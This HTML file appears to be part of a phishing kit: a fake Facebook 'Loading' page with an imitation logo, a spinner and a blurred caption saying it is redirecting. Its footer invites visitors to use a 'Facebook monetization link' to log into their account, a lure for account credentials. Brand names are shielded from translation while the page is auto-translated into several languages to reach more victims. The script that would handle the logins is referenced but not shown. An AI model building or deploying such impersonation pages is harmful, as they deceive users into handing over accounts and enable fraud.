<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Prevent brand names from being translated -->
  <meta name="google" content="notranslate">

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><span class="notranslate">Facebook</span> - Loading</title>
  <link rel="stylesheet" href="style.css">
  <style>
    .spinner {
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 6px solid #ddd;
      border-top: 6px solid #1877f2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 
      0% { transform: rotate(0deg);} 
      100% { transform: rotate(360deg);} 
    }
    .blurred { filter: blur(6px); color: #333; margin-top: 20px;}
    .clear { filter: none; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><div class="logo-circle notranslate">F</div></div>
    <div class="spinner"></div>
    <p id="caption" class="blurred">Please fill in all fields carefully. Redirecting...</p>
  </div>
  <footer>
    <p><span class="notranslate">Facebook</span> © 2025 – This is <span class="notranslate">Facebook</span> / ∞Meta. 
    Use this <span class="notranslate">Facebook</span> monetization link to log into your account and start the monetization process.</p>
  </footer>

  <!-- Google Translate -->
  <div id="google_translate_element" style="display:none;"></div>
  <script type="text/javascript">
    function googleTranslateElementInit() {
      new google.translate.TranslateElement(
        {
          pageLanguage: 'en',
          includedLanguages: 'es,fr,de,it,pt,zh-CN,ja',
          autoDisplay: false
        },
        'google_translate_element'
      );

      // Detect user browser language
      var userLang = navigator.language || navigator.userLanguage;
      userLang = userLang.split('-')[0];

      // Supported languages
      var supported = ["es","fr","de","it","pt","zh-CN","ja"];

      if (supported.includes(userLang)) {
        setTimeout(function(){
          var select = document.querySelector("select.goog-te-combo");
          if (select) {
            select.value = userLang;
            select.dispatchEvent(new Event("change"));
          }
        }, 1000);
      }
    }
  </script>
  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

  <script src="script.js"></script>
</body>
</html>
